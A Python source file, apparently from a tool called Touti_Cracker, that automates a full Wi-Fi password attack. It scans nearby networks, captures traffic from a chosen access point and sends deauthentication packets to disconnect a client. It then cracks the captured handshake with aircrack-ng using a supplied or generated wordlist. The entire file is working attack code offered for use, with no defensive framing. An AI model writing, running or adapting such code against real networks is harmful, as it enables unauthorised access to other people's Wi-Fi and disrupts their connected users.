import csv
import os
import signal
import subprocess
import time

from scripts.password_generator_script import generate_passwords


def automated_wifi_attack(OS,user):

            interface = "wlan0"

            print("🔁 Enabling monitor mode...")
            subprocess.run(f"airmon-ng start {interface}", shell=True)
            if OS == "Linux":
                output_base = "/home/" + user + "/Desktop/captures/scan"
            if OS == "Darwin":
                output_base = "/Users/" + user + "/Desktop/captures/scan"
            os.makedirs(os.path.dirname(output_base), exist_ok=True)
            extensions = [".csv", ".cap", ".netxml", ".kismet.csv", ".kismet.netxml"]

            for ext in extensions:
                path = f"{output_base}-01{ext}"
                if os.path.exists(path):
                    os.remove(path)

            print("📡 Scanning nearby networks for 15 seconds...")
            scan = subprocess.Popen(
                f"airodump-ng {interface} -w{output_base} --output-format csv",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            time.sleep(15)
            os.killpg(os.getpgid(scan.pid), signal.SIGINT)
            scan.wait()
            print("✅ Scan complete. Check 'scan-01.csv' for BSSID and Channel.")
            with open(
                "/home/" + user + "/Desktop/captures/scan-01.csv",
                newline="",
                encoding="utf-8",
            ) as csvfile:
                reader = csv.reader(csvfile)
                for row in reader:
                    print(" | ".join(row))
            target = (
                input(
                    "📥 Enter the target BSSID and channel (comma-separated, e.g. 12:34:56:78:90:AB,6): "
                )
                .strip()
                .split(",")
            )
            if len(target) != 2:
                print("❌ Invalid input.")
                return

            BSSID, Channel = target
            print(f"🎯 Target: BSSID={BSSID}, Channel={Channel}")

            print("🛰️  Starting airodump-ng for 15 seconds...")
            airodump = subprocess.Popen(
                f"airodump-ng -c {Channel} --bssid {BSSID} -w capture {interface}",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            time.sleep(15)
            airodump.terminate()
            os.killpg(os.getpgid(airodump.pid), signal.SIGINT)
            airodump.wait()
            print("✅ Capture complete. Check 'capture-01.cap' for captured packets.")
            client = input("📥 Enter the target client MAC address: ").strip()

            print("⚡ Sending deauth packets...")
            subprocess.run(
                f"aireplay-ng --deauth 10 -a {BSSID} -c {client} {interface}", shell=True
            )

            choice = input("❓ Do you have a wordlist? (y/n): ").strip().lower()
            if choice == "y":
                wordlist_path = input("📂 Enter the path to your wordlist: ").strip()
            else:
                print("⚙️ Generating a default wordlist...")
                generate_passwords()
                if OS == "Windows":
                    wordlist_path = (
                        "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\passwordlist.txt"
                    )
                if OS == "Linux":
                    wordlist_path = (
                        "/home/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
                    )
                if OS == "Darwin":
                    wordlist_path = (
                        "/Users/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
                    )

            print("🔓 Launching aircrack-ng...")
            subprocess.run(
                f"aircrack-ng -b {BSSID} -w {wordlist_path} capture-01.cap", shell=True
            )